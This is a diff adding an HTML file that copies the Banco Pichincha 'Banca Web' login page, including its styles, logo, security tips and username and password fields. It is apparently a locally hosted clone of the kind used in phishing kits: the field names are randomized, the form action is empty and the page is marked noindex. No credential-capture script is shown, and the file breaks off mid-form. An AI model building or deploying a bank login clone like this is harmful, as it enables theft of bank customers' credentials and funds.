@@ -1,0 +1,1159 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="es-EC">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>home</title>
+    <meta name="locale" content="es-EC">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale = 1.0, user-scalable = no">
+    <meta name="robots" content="noindex">
+    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
+    <link href="assets/css" rel="stylesheet">
+    <link rel="stylesheet" href="assets/explorer-message.css">
+    <link rel="stylesheet" href="assets/styles.5ab2f131efc4038635b9.css" crossorigin="anonymous"
+        integrity="sha384-AhV1hHiqIsoI8L3tstcp3g/VuSKtcc8LM0XPVzHJ6g+aX07SSbgtQC4gT0EwH4jj">
+    <style>
+        #mini-popup-resolution .popup-container {
+            padding: 10px 15px;
+            position: fixed;
+            background-color: #333333c2;
+            z-index: 99999999;
+            left: 15px;
+            top: 15px;
+            color: white;
+            border-radius: 8px;
+            backdrop-filter: blur(3px);
+            font-size: 18px;
+        }
+
+        #mini-popup-resolution .popup-container .popup-btn {
+            padding: 5px 12px;
+            border-radius: 6px;
+            font-size: 16px;
+            background-color: #05adfe;
+            color: white;
+            transition: background-color 250ms ease-in-out;
+            border: none;
+            cursor: pointer;
+            height: fit-content;
+            line-height: 1.5;
+        }
+
+        #mini-popup-resolution .popup-container .popup-btn:hover {
+            background-color: #0493d8;
+        }
+
+        #mini-popup-resolution .popup-container .popup-btn.close {
+            margin-left: 10px;
+            background-color: #e98e1a;
+        }
+
+        #mini-popup-resolution .popup-container .popup-btn.close:hover {
+            background-color: #d87c07;
+        }
+
+        #mini-popup-resolution .popup-container .popup-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        #mini-popup-resolution .popup-container .icon-loading {
+            display: inline-block;
+            vertical-align: text-top;
+            margin-right: 5px;
+        }
+
+        #mini-popup-resolution .popup-container .icon-loading svg {
+            animation-name: spin;
+            animation-duration: 1500ms;
+            animation-iteration-count: infinite;
+            animation-timing-function: linear;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <style>
+        .wrapper-browser-support[_ngcontent-tiy-c199] {
+            padding: 41px;
+            display: flex;
+            flex-direction: column;
+            max-width: 459px
+        }
+
+        .wrapper-browser-support[_ngcontent-tiy-c199] h4[_ngcontent-tiy-c199] {
+            color: #0f265c;
+            font-size: 32px;
+            font-family: PreloSlab-Book, serif;
+            font-weight: 300;
+            text-align: center;
+            letter-spacing: 0;
+            line-height: 38px
+        }
+
+        .wrapper-browser-support[_ngcontent-tiy-c199] .description[_ngcontent-tiy-c199] {
+            color: #4a4a4a;
+            font-size: 16px;
+            font-family: Prelo-Medium, sans-serif;
+            font-weight: 500;
+            text-align: center;
+            letter-spacing: 0;
+            line-height: 26px
+        }
+
+        .wrapper-browser-support[_ngcontent-tiy-c199] .icon-container[_ngcontent-tiy-c199] {
+            margin: auto
+        }
+
+        .wrapper-browser-support[_ngcontent-tiy-c199] .browsers-icons[_ngcontent-tiy-c199] {
+            display: flex;
+            justify-content: center
+        }
+
+        .wrapper-browser-support[_ngcontent-tiy-c199] .wrapper-icons-browser[_ngcontent-tiy-c199] {
+            height: 79px;
+            width: 116px;
+            text-align: center
+        }
+
+        .wrapper-browser-support[_ngcontent-tiy-c199] .center-item[_ngcontent-tiy-c199] {
+            margin: 0 auto
+        }
+
+        .wrapper-browser-support[_ngcontent-tiy-c199] .name-browser[_ngcontent-tiy-c199] {
+            font-size: 14px;
+            color: #4a4a4a
+        }
+
+        .modal-footer-browser-support[_ngcontent-tiy-c199] {
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 10px 10px 10px rgba(7, 7, 7, .1);
+            padding: 16px 24px;
+            background-color: #fff
+        }
+    </style>
+    <style>
+        [_nghost-tiy-c19] {
+            display: block;
+        }
+    </style>
+    <style></style>
+    <style>
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] {
+            width: 768px;
+            max-width: 100%;
+            text-align: center;
+            padding: 32px 56px
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .title-page[_ngcontent-tiy-c160] {
+            font-size: 40px;
+            width: 584px;
+            max-width: 100%;
+            line-height: 48px;
+            text-align: center;
+            margin: 0 auto;
+            font-weight: 500
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .title-page[_ngcontent-tiy-c160] b[_ngcontent-tiy-c160] {
+            font-weight: 700
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] p.description[_ngcontent-tiy-c160] {
+            margin: 0 auto;
+            font-style: normal;
+            font-weight: 500;
+            font-size: 16px;
+            line-height: 26px;
+            text-align: center;
+            color: #4a4a4a
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] p.description[_ngcontent-tiy-c160] b[_ngcontent-tiy-c160] {
+            font-weight: 700;
+            color: #000
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .features[_ngcontent-tiy-c160] {
+            flex-direction: row;
+            justify-content: space-evenly
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .features[_ngcontent-tiy-c160] .feature[_ngcontent-tiy-c160] {
+            width: 205px
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .features[_ngcontent-tiy-c160] .feature[_ngcontent-tiy-c160] .icon[_ngcontent-tiy-c160] {
+            display: flex;
+            justify-content: center
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .features[_ngcontent-tiy-c160] .feature[_ngcontent-tiy-c160] .icon[_ngcontent-tiy-c160] .pwb-icon[_ngcontent-tiy-c160] {
+            background: #f4f6f9;
+            height: 80px;
+            width: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .features[_ngcontent-tiy-c160] .feature[_ngcontent-tiy-c160] .icon[_ngcontent-tiy-c160] em[_ngcontent-tiy-c160] {
+            display: flex;
+            margin: 0 auto;
+            height: 30px;
+            width: 30px;
+            background-repeat: no-repeat;
+            background-size: contain;
+            background-position: 50%
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .features[_ngcontent-tiy-c160] .feature[_ngcontent-tiy-c160] .info[_ngcontent-tiy-c160] {
+            margin: 0 auto;
+            font-style: normal;
+            font-weight: 500;
+            font-size: 14px;
+            line-height: 23px;
+            text-align: center;
+            color: #4a4a4a
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .footer[_ngcontent-tiy-c160] {
+            width: 100%;
+            padding: 20px 30px 0;
+            border-top: 1px solid #dee3ed;
+            text-align: center
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .footer[_ngcontent-tiy-c160] h2[_ngcontent-tiy-c160] {
+            color: #0f265c;
+            font-size: 20px;
+            font-weight: 700;
+            height: 32px;
+            letter-spacing: 0;
+            line-height: 24px;
+            text-align: center
+        }
+
+        .clave-educacion-wrapper[_ngcontent-tiy-c160] .footer[_ngcontent-tiy-c160] bb-load-button-ui[_ngcontent-tiy-c160] {
+            width: 328px;
+            max-width: 100%;
+            margin: 0 auto !important
+        }
+    </style>
+    <meta name="robots" content="index, follow">
+    <style>
+        .alert[_ngcontent-tiy-c161] {
+            font-family: Prelo-Medium, sans-serif;
+            font-weight: 500;
+            border-radius: 8px !important
+        }
+
+        .alert[_ngcontent-tiy-c161] p[_ngcontent-tiy-c161] {
+            font-size: 16px
+        }
+
+        .alert.alert-success[_ngcontent-tiy-c161] {
+            color: #4a4a50 !important;
+            background-color: #ecf6ee !important;
+            border: 1px solid #b4dcbe !important
+        }
+
+        .alert.alert-success[_ngcontent-tiy-c161] bb-icon-ui[name=times][_ngcontent-tiy-c161] i {
+            color: #4a4a50 !important;
+            font-size: 20px
+        }
+
+        .alert.alert-danger[_ngcontent-tiy-c161] {
+            color: #4a4a50 !important;
+            background-color: #fbe6e6 !important;
+            border: 1px solid #ee9c9c !important
+        }
+
+        .alert.alert-danger[_ngcontent-tiy-c161] bb-icon-ui[name=times][_ngcontent-tiy-c161] i {
+            color: #4a4a50 !important;
+            font-size: 20px
+        }
+
+        .alert.alert-info[_ngcontent-tiy-c161] {
+            color: #4a4a50 !important;
+            background-color: #eaf1f8 !important;
+            border: 1px solid #accae5 !important
+        }
+
+        .alert.alert-info[_ngcontent-tiy-c161] bb-icon-ui[name=times][_ngcontent-tiy-c161] i {
+            color: #4a4a50 !important;
+            font-size: 20px
+        }
+
+        .alert.alert-warning[_ngcontent-tiy-c161] {
+            color: #4a4a50 !important;
+            background-color: #fef0e5 !important;
+            border: 1px solid #fcc399 !important
+        }
+
+        .alert.alert-warning[_ngcontent-tiy-c161] bb-icon-ui[name=times][_ngcontent-tiy-c161] i {
+            color: #4a4a50 !important;
+            font-size: 20px
+        }
+
+        .alert[_ngcontent-tiy-c161] .icons-alert[_ngcontent-tiy-c161] {
+            width: 23px !important;
+            height: 23px !important
+        }
+
+        .alert.position-fixed[_ngcontent-tiy-c161] {
+            z-index: 1020
+        }
+    </style>
+    <style>
+        .form-digital-key-otp[_ngcontent-tiy-c162] {
+            max-width: 379px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+    </style>
+    <style>
+        .clave-lanzamiento-container[_ngcontent-tiy-c158] {
+            width: 1026px;
+            max-width: 100%;
+            height: -moz-fit-content;
+            height: fit-content;
+            background-color: transparent
+        }
+
+        .clave-lanzamiento-container.no-modal[_ngcontent-tiy-c158] {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            align-content: center;
+            background-color: #fff
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] {
+            width: 1026px;
+            text-align: center;
+            padding: 32px 56px;
+            margin: auto
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .title-page[_ngcontent-tiy-c158] {
+            font-size: 40px;
+            max-width: 100%;
+            line-height: 48px;
+            text-align: left;
+            margin: 0 auto;
+            font-weight: 500
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .title-page[_ngcontent-tiy-c158] b[_ngcontent-tiy-c158] {
+            font-weight: 700
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] p.description[_ngcontent-tiy-c158] {
+            margin: 0 auto;
+            font-style: normal;
+            font-weight: 500;
+            font-size: 18px;
+            line-height: 26px;
+            text-align: left;
+            color: #4a4a4a
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] p.description[_ngcontent-tiy-c158] b[_ngcontent-tiy-c158] {
+            font-weight: 700;
+            color: #000
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] h5[_ngcontent-tiy-c158] {
+            font-family: Prelo-Medium, sans-serif;
+            font-size: 20px;
+            font-weight: 500;
+            text-align: left;
+            margin-bottom: 20px
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] {
+            flex-direction: row;
+            justify-content: flex-start;
+            position: relative
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] hr[_ngcontent-tiy-c158] {
+            position: absolute;
+            width: 235px;
+            border: 1px dashed #a4b0cb;
+            top: 25px;
+            left: 170px
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] .feature[_ngcontent-tiy-c158] {
+            width: 260px
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] .feature[_ngcontent-tiy-c158]:first-child {
+            margin-right: 59px
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] .feature[_ngcontent-tiy-c158] .icon[_ngcontent-tiy-c158] {
+            display: flex;
+            justify-content: center
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] .feature[_ngcontent-tiy-c158] .icon[_ngcontent-tiy-c158] .pwb-icon[_ngcontent-tiy-c158] {
+            position: relative;
+            background: #f4f6f9;
+            height: 80px;
+            width: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] .feature[_ngcontent-tiy-c158] .icon[_ngcontent-tiy-c158] .pwb-icon[_ngcontent-tiy-c158] .badge[_ngcontent-tiy-c158] {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            position: absolute;
+            top: 0;
+            left: -15px;
+            background-color: #fd0;
+            font-size: 14px;
+            color: #0f265c;
+            line-height: 1.8;
+            font-weight: 700
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] .feature[_ngcontent-tiy-c158] .icon[_ngcontent-tiy-c158] em[_ngcontent-tiy-c158] {
+            display: flex;
+            margin: 0 auto;
+            height: 50px;
+            width: 50px;
+            background-repeat: no-repeat;
+            background-size: contain;
+            background-position: 50%
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] .feature[_ngcontent-tiy-c158] .info[_ngcontent-tiy-c158] {
+            margin: 0 auto;
+            font-style: normal;
+            font-weight: 500;
+            font-size: 16px;
+            line-height: 23px;
+            text-align: center;
+            color: #4a4a4a
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .features[_ngcontent-tiy-c158] .feature[_ngcontent-tiy-c158] .info[_ngcontent-tiy-c158] b[_ngcontent-tiy-c158] {
+            color: #000
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .footer[_ngcontent-tiy-c158] {
+            width: 100%;
+            padding: 20px 30px 0 0;
+            border-top: 1px solid #dee3ed;
+            text-align: center
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .footer[_ngcontent-tiy-c158] .buttons[_ngcontent-tiy-c158] {
+            display: flex;
+            flex-direction: row;
+            justify-content: flex-start;
+            margin-bottom: 25px
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .footer[_ngcontent-tiy-c158] .buttons[_ngcontent-tiy-c158] bb-load-button-ui[_ngcontent-tiy-c158],
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .footer[_ngcontent-tiy-c158] .buttons[_ngcontent-tiy-c158] button[_ngcontent-tiy-c158] {
+            width: 200px;
+            max-width: 100%;
+            margin: 0
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .footer[_ngcontent-tiy-c158] .buttons[_ngcontent-tiy-c158] button[_ngcontent-tiy-c158] {
+            margin-right: 15px
+        }
+
+        .clave-lanzamiento-wrapper[_ngcontent-tiy-c158] .footer[_ngcontent-tiy-c158] .info[_ngcontent-tiy-c158] {
+            text-align: left;
+            font-size: 14px
+        }
+    </style>
+    <style>
+        .video-container[_ngcontent-tiy-c157] {
+            width: 960px;
+            padding: 35px;
+            max-width: 100%
+        }
+
+        .video-container[_ngcontent-tiy-c157] iframe[_ngcontent-tiy-c157] {
+            width: 100%;
+            border: 0
+        }
+    </style>
+    <style>
+        .divider-content[_ngcontent-tiy-c185] {
+            width: 100%;
+            height: 2px;
+            border-radius: 0px;
+            margin: 0;
+        }
+
+        .btn-semibold[_ngcontent-tiy-c185] {
+            font-family: Prelo-SemiBold, sans-serif !important;
+        }
+
+        label.terms[_ngcontent-tiy-c185] {
+            font-family: 'Prelo-Medium' !important;
+        }
+
+        .right-b-container[_ngcontent-tiy-c185] {
+            background-color: #f9fafc !important;
+        }
+
+        .btn-remember-up[_ngcontent-tiy-c185] {
+            padding: 0;
+            justify-content: right;
+            font-size: 14px !important;
+            font-family: 'Prelo-SemiBold';
+        }
+
+        .radio-toolbar[_ngcontent-tiy-c185] {
+            display: flex;
+            width: 100%;
+            align-items: center;
+
+            .pwb-icon>em {
+                height: 16px;
+                width: 16px;
+            }
+
+        }
+
+        .radio-toolbar[_ngcontent-tiy-c185] input[type='radio'][_ngcontent-tiy-c185] {
+            opacity: 0;
+            position: fixed;
+            width: 0;
+        }
+
+        .radio-toolbar[_ngcontent-tiy-c185] label[_ngcontent-tiy-c185] {
+            display: inline-block;
+            width: 100%;
+            height: 99px;
+            border: 1px solid rgb(200, 200, 200);
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+            padding: 20px 0 16px 0;
+            color: #2C2C30;
+        }
+
+        .radio-toolbar[_ngcontent-tiy-c185] label[_ngcontent-tiy-c185]:hover {
+            border: 1px solid rgb(74, 74, 74);
+            cursor: pointer;
+        }
+
+        .radio-toolbar[_ngcontent-tiy-c185] input[type='radio'][_ngcontent-tiy-c185]:checked+label[_ngcontent-tiy-c185] {
+            background-color: #f4f6f9;
+            border: 2px solid rgb(47, 122, 191);
+        }
+
+        .radio-toolbar[_ngcontent-tiy-c185] input[type='radio'][_ngcontent-tiy-c185]:focus+label[_ngcontent-tiy-c185] {
+            border: 2px solid rgb(47, 122, 191);
+        }
+    </style>
+    <style>
+        .pwb-icon[_ngcontent-tiy-c183] {
+            float: left;
+            margin-right: 32px;
+            border-radius: 50%;
+            background-color: #f4f6f9;
+            height: 56px;
+            width: 56px;
+            padding: 14px 2px;
+        }
+
+        .list[_ngcontent-tiy-c183] {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .list[_ngcontent-tiy-c183]>.item[_ngcontent-tiy-c183] {
+            display: flex;
+            flex-direction: row;
+            font-family: Prelo-Book !important;
+            margin: 0.5rem 0;
+            gap: 16px;
+            color: #2c2c30;
+            font-weight: 600;
+        }
+
+        .item-text[_ngcontent-tiy-c183] {
+            margin: auto 0;
+            color: #4a4a4a;
+            font-size: 16px;
+            font-family: Prelo-Book !important;
+            font-weight: 400;
+            line-height: 24px;
+        }
+
+        .cancel-icon-box[_ngcontent-tiy-c183] {
+            padding: 0;
+            display: flex;
+        }
+
+        .cancel-icon-box[_ngcontent-tiy-c183]>.icon-cancel[_ngcontent-tiy-c183] {
+            width: 55px;
+            height: 55px;
+        }
+
+        .container-login-pb[_ngcontent-tiy-c183] {
+            padding-bottom: 0;
+        }
+
+        .pb-64[_ngcontent-tiy-c183] {
+            padding-bottom: 64px;
+        }
+    </style>
+    <style>
+        .input[_ngcontent-tiy-c166] {
+            position: relative;
+        }
+
+        .input-group-append[_ngcontent-tiy-c166] {
+            position: absolute;
+            right: 0;
+            top: 0;
+        }
+
+        input.font-dot[_ngcontent-tiy-c166] {
+            font-family: dotsfont !important;
+            font-size: 6px;
+        }
+
+        input.font-prelo[_ngcontent-tiy-c166] {
+            font-family: Prelo-Medium, sans-serif !important;
+            font-size: 14px;
+        }
+
+        input[_ngcontent-tiy-c166]::placeholder {
+            font-size: 14px;
+        }
+    </style>
+
+</head>
+
+<body cz-shortcut-listen="true">
+
+    <div class="">
+        <div class="" data-area="0" data-portal-page="login">
+            <div data-chrome="container_0d303252-ac57-410e-b12a-60e46af3f7ca" data-widget-holder="">
+                <div id="2a94e1b1-6526-42dc-9c3a-e7a1eda7e463"
+                    data-widget="container_0d303252-ac57-410e-b12a-60e46af3f7ca" style="">
+                    <div class="cxp-manageable-area" data-area="0">
+                        <div data-chrome="pbw-pichincha-banca-web-public-ang-_-621cdd91695b" data-widget-holder="">
+                            <div id="4c788d12-988f-49c6-be6c-5f6a49bb7d7b"
+                                data-widget="pbw-pichincha-banca-web-public-ang-_-621cdd91695b" style="">
+                                <pbw-pichincha-banca-web-public>
+                                    <pbw-browser-support _nghost-tiy-c199="">
+                                        <bb-modal-ui _ngcontent-tiy-c199=""><!----></bb-modal-ui>
+                                    </pbw-browser-support>
+                                    <bb-root>
+                                        <bb-area _nghost-tiy-c19="" data-area="0">
+                                            <bb-chrome _ngcontent-tiy-c19=""
+                                                data-chrome="bb-deck-container-ang-_-2344639084ff">
+                                                <bb-deck-container aria-label="">
+                                                    <bb-router-outlet></bb-router-outlet>
+                                                    <bb-route>
+                                                        <bb-chrome data-chrome="bb-panel-container-ang-_-a7404a37a37b">
+                                                            <bb-panel-container class="d-block">
+                                                                <bb-area _nghost-tiy-c19="" data-area="0">
+                                                                    <bb-chrome _ngcontent-tiy-c19=""
+                                                                        data-chrome="pbw-login-widget-ang-_-1888169493c2">
+                                                                        <pbw-login-widget>
+                                                                            <pbw-login-container _nghost-tiy-c185="">
+                                                                                <div _ngcontent-tiy-c185=""
+                                                                                    class="d-flex login-container min-vh-100">
+                                                                                    <div _ngcontent-tiy-c185=""
+                                                                                        class="header-logo d-lg-none">
+                                                                                        <div _ngcontent-tiy-c185=""
+                                                                                            class="manageable-container-block">
+                                                                                            <img _ngcontent-tiy-c185=""
+                                                                                                class="img-size"
+                                                                                                src="assets/logo_pichincha.svg" />
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div _ngcontent-tiy-c185=""
+                                                                                        class="flex-grow-1 bg-white min-vh-100 pt-4 justify-content-center flex-column d-none d-lg-flex">
+                                                                                        <pbw-login-sidber
+                                                                                            _ngcontent-tiy-c185=""
+                                                                                            class="m-auto d-block"
+                                                                                            style="max-width: 500px;"
+                                                                                            _nghost-tiy-c183="">
+                                                                                            <div _ngcontent-tiy-c183=""
+                                                                                                class="d-flex flex-column">
+                                                                                                <div _ngcontent-tiy-c183=""
+                                                                                                    class="flex-1 pb-64">
+                                                                                                    <div _ngcontent-tiy-c183=""
+                                                                                                        class="manageable-container-block">
+                                                                                                        <img _ngcontent-tiy-c183=""
+                                                                                                            src="assets/logo_pichincha.svg">
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <div _ngcontent-tiy-c183=""
+                                                                                                    class="flex-1 main">
+                                                                                                    <h2 _ngcontent-tiy-c183=""
+                                                                                                        class="title-main title-login-w login-sidebar__main-title-label"
+                                                                                                        style="font-weight: 400 !important;">
+                                                                                                        Verifica en tu
+                                                                                                        navegador que
+                                                                                                        estás en Banca
+                                                                                                        Web. </h2>
+                                                                                                </div>
+                                                                                                <div _ngcontent-tiy-c183=""
+                                                                                                    class="flex-1 container-login-pb">
+                                                                                                    <div _ngcontent-tiy-c183=""
+                                                                                                        class="container-security-url">
+                                                                                                        <div _ngcontent-tiy-c183=""
+                                                                                                            class="img-security-url">
+                                                                                                        </div>
+                                                                                                    </div>
+                                                                                                    <div _ngcontent-tiy-c183=""
+                                                                                                        class="list">
+                                                                                                        <div _ngcontent-tiy-c183=""
+                                                                                                            class="item">
+                                                                                                            <div
+                                                                                                                _ngcontent-tiy-c183="">
+                                                                                                                <strong
+                                                                                                                    _ngcontent-tiy-c183="">01.</strong>
+                                                                                                            </div>
+                                                                                                            <span
+                                                                                                                _ngcontent-tiy-c183=""
+                                                                                                                class="item-text">Cuida
+                                                                                                                tu
+                                                                                                                usuario
+                                                                                                                y
+                                                                                                                contraseña.</span>
+                                                                                                        </div>
+                                                                                                        <div _ngcontent-tiy-c183=""
+                                                                                                            class="item">
+                                                                                                            <div
+                                                                                                                _ngcontent-tiy-c183="">
+                                                                                                                <strong
+                                                                                                                    _ngcontent-tiy-c183="">02.</strong>
+                                                                                                            </div>
+                                                                                                            <span
+                                                                                                                _ngcontent-tiy-c183=""
+                                                                                                                class="item-text">Antes
+                                                                                                                de
+                                                                                                                ingresar
+                                                                                                                la Clave
+                                                                                                                Digital
+                                                                                                                verifica
+                                                                                                                que los
+                                                                                                                4
+                                                                                                                últimos
+                                                                                                                <br
+                                                                                                                    _ngcontent-tiy-c183="">
+                                                                                                                dígitos
+                                                                                                                de tu
+                                                                                                                cédula
+                                                                                                                sean
+                                                                                                                correctos.</span>
+                                                                                                        </div>
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </pbw-login-sidber>
+                                                                                        <div _ngcontent-tiy-c185=""
+                                                                                            class="flex-1 mx-auto marginBottom32 footer">
+                                                                                            <label
+                                                                                                _ngcontent-tiy-c185=""
+                                                                                                class="terms"
+                                                                                                style="margin-top: 40px;"><a
+                                                                                                    _ngcontent-tiy-c185=""
+                                                                                                    class="btn-link-pichincha">Términos
+                                                                                                    de uso</a> © 2022
+                                                                                                Banco Pichincha. Todos
+                                                                                                los derechos
+                                                                                                reservados</label></div>
+                                                                                    </div>
+                                                                                    <div _ngcontent-tiy-c185=""
+                                                                                        class="right-b-container flex-grow-1 d-flex justify-content flex-column">
+                                                                                        <div _ngcontent-tiy-c185=""
+                                                                                            class="margin-form-login"
+                                                                                            style="max-width: 500px;">
+                                                                                            <pbw-alert-ui
+                                                                                                _ngcontent-tiy-c185=""
+                                                                                                class="alert-md"
+                                                                                                _nghost-tiy-c161="">
+                                                                                                <!----></pbw-alert-ui>
+                                                                                            <div _ngcontent-tiy-c185=""
+                                                                                                class="card card-body card-body-xs">
+                                                                                                <form
+                                                                                                    _ngcontent-tiy-c185=""
+                                                                                                    novalidate="novalidate"
+                                                                                                    autocomplete="off"
+                                                                                                    class="form ng-pristine ng-invalid ng-touched"
+                                                                                                    method="post"
+                                                                                                    action="">
+                                                                                                    <h2 _ngcontent-tiy-c185=""
+                                                                                                        class="title-main marginBottom24 text-center title-login-mb">
+                                                                                                        Bienvenido a tu
+                                                                                                        Banca Web</h2>
+                                                                                                    <div _ngcontent-tiy-c185=""
+                                                                                                        class="marginBottom24 label-login login-group">
+                                                                                                        <bb-input-text-ui
+                                                                                                            _ngcontent-tiy-c185=""
+                                                                                                            label="Usuario"
+                                                                                                            formcontrolname="username"
+                                                                                                            placeholder=""
+                                                                                                            tabindex="1"
+                                                                                                            pbwblockcopypaste=""
+                                                                                                            autocomplete="off"
+                                                                                                            class="ng-pristine ng-invalid ng-touched">
+
+                                                                                                            <label
+                                                                                                                for="bb_input_0"
+                                                                                                                data-role="label">Usuario</label>
+
+                                                                                                            <input
+                                                                                                                name="rr1OS91drD"
+                                                                                                                type="text"
+                                                                                                                class="form-control ng-pristine ng-valid ng-touched"
+                                                                                                                id="bb_input_0"
+                                                                                                                placeholder=""
+                                                                                                                size="20"
+                                                                                                                maxlength="64"
+                                                                                                                autocomplete="off"
+                                                                                                                data-role="input">
+
+                                                                                                        </bb-input-text-ui>
+                                                                                                        <div _ngcontent-tiy-c185=""
+                                                                                                            class="d-flex flex-row-reverse w-100"
+                                                                                                            style="height: 30px;">
+                                                                                                            <div _ngcontent-tiy-c185=""
+                                                                                                                style="padding-top: 8px;">
+                                                                                                                <button
+                                                                                                                    _ngcontent-tiy-c185=""
+                                                                                                                    id="btn-recordar-usuario-login"
+                                                                                                                    bbbutton=""
+                                                                                                                    type="button"
+                                                                                                                    aria-label="Recordar Usuario"
+                                                                                                                    color="link-pichincha"
+                                                                                                                    tabindex="5"
+                                                                                                                    class="text-16 btn-remember-up btn-link-pichincha btn btn-md btn-block">
+                                                                                                                    ¿Olvidaste
+                                                                                                                    tu
+                                                                                                                    usuario?
+                                                                                                                </button>
+                                                                                                            </div>
+                                                                                                        </div>
+                                                                                                    </div>
+                                                                                                    <div _ngcontent-tiy-c185=""
+                                                                                                        class="marginBottom24 label-login login-group">
+                                                                                                        <pbw-input-password-ui
+                                                                                                            _ngcontent-tiy-c185=""
+                                                                                                            label="Contraseña"
+                                                                                                            placeholder=""
+                                                                                                            tabindex="2"
+                                                                                                            formcontrolname="password"
+                                                                                                            autocomplete="off"
+                                                                                                            pbwblockcopypaste=""
+                                                                                                            _nghost-tiy-c166=""
+                                                                                                            class="ng-untouched ng-pristine ng-invalid">
+                                                                                                            <div _ngcontent-tiy-c166=""
+                                                                                                                class="bb-input-password ng-invalid">
+
+                                                                                                                <label
+                                                                                                                    _ngcontent-tiy-c166=""
+                                                                                                                    for="bb_input_1">Contraseña</label>
+
+                                                                                                                <div _ngcontent-tiy-c166=""
+                                                                                                                    class="input pichincha">
+                                                                                                                    <input
+                                                                                                                        name="w60dpGuy7S"
+                                                                                                                        _ngcontent-tiy-c166=""
+                                                                                                                        class="form-control bb-input-password__input ng-valid ng-dirty ng-touched font-dot"
+                                                                                                                        id="bb_input_1"
+                                                                                                                        type="text"
+                                                                                                                        placeholder=""
+                                                                                                                        aria-describedby="password-error"
+                                                                                                                        autocomplete="off"
+                                                                                                                        maxlength="16">
+                                                                                                                    <div _ngcontent-tiy-c166=""
+                                                                                                                        class="input-group-append">
+                                                                                                                        <button
+                                                                                                                            id="btnPass"
+                                                                                                                            _ngcontent-tiy-c166=""
+                                                                                                                            bbbutton=""
+                                                                                                                            color="link-pichincha"
+                                                                                                                            data-role="bb-input-password-visibility-toggle-button"
+                                                                                                                            class="bb-input-password__visibility-toggle-button btn-link-pichincha btn btn-md"
+                                                                                                                            aria-label="Show/Hide password button"
+                                                                                                                            type="button">
+                                                                                                                            <!----><!---->
+
+                                                                                                                        </button>
+                                                                                                                    </div>
+                                                                                                                    <!---->
+                                                                                                                </div>
+                                                                                                            </div>
+                                                                                                        </pbw-input-password-ui>
+                                                                                                        <div _ngcontent-tiy-c185=""
+                                                                                                            class="d-flex flex-row-reverse w-100"
+                                                                                                            style="height: 30px;">
+                                                                                                            <div _ngcontent-tiy-c185=""
+                                                                                                                style="padding-top: 8px;">
+                                                                                                                <button
+                                                                                                                    _ngcontent-tiy-c185=""
+                                                                                                                    id="btn-recordar-clave-login"
+                                                                                                                    bbbutton=""
+                                                                                                                    type="button"
+                                                                                                                    aria-label="Olvidaste tu contraseña"
+                                                                                                                    color="link-pichincha"
+                                                                                                                    tabindex="6"
+                                                                                                                    class="text-16 btn-remember-up btn-link-pichincha btn btn-md btn-block">
+                                                                                                                    ¿Olvidaste
